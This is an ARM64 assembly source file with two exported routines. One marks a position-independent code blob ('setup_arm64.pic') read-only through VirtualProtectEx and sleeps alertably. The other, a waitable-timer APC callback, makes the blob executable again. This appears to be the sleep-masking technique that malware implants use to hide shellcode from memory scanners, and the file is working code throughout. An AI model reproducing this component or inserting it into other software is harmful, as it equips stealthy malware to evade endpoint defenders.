        AREA    |.text|, CODE, READONLY, ALIGN=4
        EXPORT  wait_entry
        EXPORT  callback_entry

ArmConfiguration_setup_address        EQU 0x08
ArmConfiguration_setup_length         EQU 0x10
ArmConfiguration_VirtualProtectEx     EQU 0x28
ArmConfiguration_SleepEx               EQU 0x30
ArmConfiguration_old_protection       EQU 0x64
ArmConfiguration_callback_rounds      EQU 0x74

PAGE_READONLY                         EQU 0x02
PAGE_EXECUTE_READ                     EQU 0x20

wait_entry
        b       wait_body
        nop
        nop
        nop

callback_entry
        b       callback_body
        nop
        nop
        nop

; Called from setup_arm64 as void wait_entry(ArmConfiguration*).
; This remains executable while setup_arm64.pic is parked PAGE_READONLY.
wait_body
        stp     x19, x30, [sp, #-16]!
        mov     x19, x0

        ; VirtualProtectEx(GetCurrentProcess(), setup_addr, setup_length,
        ;                  PAGE_READONLY, &old_protection)
        mvn     x0, xzr
        ldr     x1, [x19, #ArmConfiguration_setup_address]
        ldr     x2, [x19, #ArmConfiguration_setup_length]
        mov     w3, #PAGE_READONLY
        add     x4, x19, #ArmConfiguration_old_protection
        ldr     x8, [x19, #ArmConfiguration_VirtualProtectEx]
        blr     x8

        ; SleepEx(INFINITE, TRUE)
        mvn     w0, wzr
        mov     w1, #1
        ldr     x8, [x19, #ArmConfiguration_SleepEx]
        blr     x8

        ; Returning to setup_arm64.pic is safe only after execute permission is restored.
        ; The APC callback normally did this already, so this restore is idempotent.
        mvn     x0, xzr
        ldr     x1, [x19, #ArmConfiguration_setup_address]
        ldr     x2, [x19, #ArmConfiguration_setup_length]
        mov     w3, #PAGE_EXECUTE_READ
        add     x4, x19, #ArmConfiguration_old_protection
        ldr     x8, [x19, #ArmConfiguration_VirtualProtectEx]
        blr     x8

        ldp     x19, x30, [sp], #16
        ret

; Called by the waitable timer APC as:
; void CALLBACK TimerAPCProc(config, timer_low, timer_high).
callback_body
        stp     x19, x30, [sp, #-16]!
        mov     x19, x0

        ldr     w8, [x19, #ArmConfiguration_callback_rounds]
        add     w8, w8, #1
        str     w8, [x19, #ArmConfiguration_callback_rounds]

        ; VirtualProtectEx(GetCurrentProcess(), setup_addr, setup_length,
        ;                  PAGE_EXECUTE_READ, &old_protection)
        mvn     x0, xzr
        ldr     x1, [x19, #ArmConfiguration_setup_address]
        ldr     x2, [x19, #ArmConfiguration_setup_length]
        mov     w3, #PAGE_EXECUTE_READ
        add     x4, x19, #ArmConfiguration_old_protection
        ldr     x8, [x19, #ArmConfiguration_VirtualProtectEx]
        blr     x8

        ldp     x19, x30, [sp], #16
        ret
        END
